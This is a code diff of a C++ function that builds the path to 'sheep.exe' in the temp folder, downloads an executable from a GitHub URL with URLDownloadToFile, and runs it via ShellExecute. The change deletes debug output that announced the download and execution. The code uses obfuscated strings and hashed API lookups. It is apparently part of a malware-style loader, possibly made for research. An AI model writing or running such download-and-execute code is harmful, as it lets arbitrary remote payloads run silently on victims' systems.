@@ -404,16 +404,12 @@ int callout(void)
 
    char temp_path[MAX_PATH+1];
    char slash_sheep[] = {'\\','s','h','e','e','p','.','e','x','e',0};
-
-   std::wcout << "URLDownloadToFileA: " << std::hex << fnv321a("URLDownloadToFileA") << std::endl;
    
    getTempPath2(MAX_PATH, temp_path);
    strncat(temp_path, slash_sheep, strlen(slash_sheep));
 
    if (getFileAttributes(temp_path) == INVALID_FILE_ATTRIBUTES)
    {
-      std::wcout << "Downloading payload..." << std::hex << reinterpret_cast<std::uintptr_t>(urlDownloadToFile) << std::endl;
-
       if (urlDownloadToFile(nullptr,
                             "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
                             temp_path,
@@ -421,8 +417,6 @@ int callout(void)
                             nullptr) != 0)
          return 2;
    }
-
-   std::wcout << "Executing payload..." << temp_path << std::endl;
 
    if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
       return 3;
